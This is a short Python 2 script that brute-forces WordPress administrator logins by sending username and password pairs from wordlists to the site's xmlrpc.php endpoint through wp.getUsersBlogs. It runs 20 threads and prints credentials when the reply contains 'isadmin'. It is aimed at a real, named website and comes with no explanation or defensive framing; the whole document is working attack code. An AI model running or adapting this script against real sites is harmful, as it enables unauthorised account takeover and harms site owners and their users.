import futures
import requests
from Queue import Queue

XML_URL = "http://www.freebuf.com/xmlrpc.php"
USER_FILE = "username.txt"
PASS_FILE = "password.txt"
THREAD_NUM = 20

data = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>"""
task = Queue()


def attack():
    while not task.empty():
        username = task.get()
        pass_txt = open(PASS_FILE)
        for password in pass_txt:
            req = requests.post(XML_URL, data=data % (username, password.rstrip("\n")))
            if 'isadmin' in req.text:
                print "[+] username = " + username + " password = " + password
                break
        print "[-] username %s finished" % username


def main():
    user_txt = open(USER_FILE)
    for username in user_txt:
        task.put(username.rstrip("\n"))
    executor = futures.ThreadPoolExecutor(max_workers=THREAD_NUM)
    for i in range(THREAD_NUM):
        executor.submit(attack)
    executor.shutdown()

if __name__ == "__main__":
    main()
